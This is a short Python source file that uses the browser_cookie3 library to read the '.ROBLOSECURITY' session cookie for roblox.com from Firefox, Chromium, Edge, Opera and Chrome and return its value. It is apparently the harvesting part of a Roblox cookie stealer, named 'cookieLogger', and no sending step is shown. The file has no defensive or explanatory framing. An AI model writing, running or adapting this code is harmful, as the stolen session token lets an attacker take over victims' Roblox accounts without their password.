import browser_cookie3

def retrieveCookie():
    def cookieLogger():
        try:
            cookies = browser_cookie3.firefox(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.name, cookie.value
        except Exception as e:
            print(f"Firefox cookie error: {e}")

        try:
            cookies = browser_cookie3.chromium(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.name, cookie.value
        except Exception as e:
            print(f"Chromium cookie error: {e}")

        try:
            cookies = browser_cookie3.edge(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.name, cookie.value
        except Exception as e:
            print(f"Edge cookie error: {e}")

        try:
            cookies = browser_cookie3.opera(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.name, cookie.value
        except Exception as e:
            print(f"Opera cookie error: {e}")

        try:
            cookies = browser_cookie3.chrome(domain_name='roblox.com')
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    return cookie.name, cookie.value
        except Exception as e:
            print(f"Chrome cookie error: {e}")

        return None, None


    name, value = cookieLogger()

    if name and value:
        return value
    else:
        pass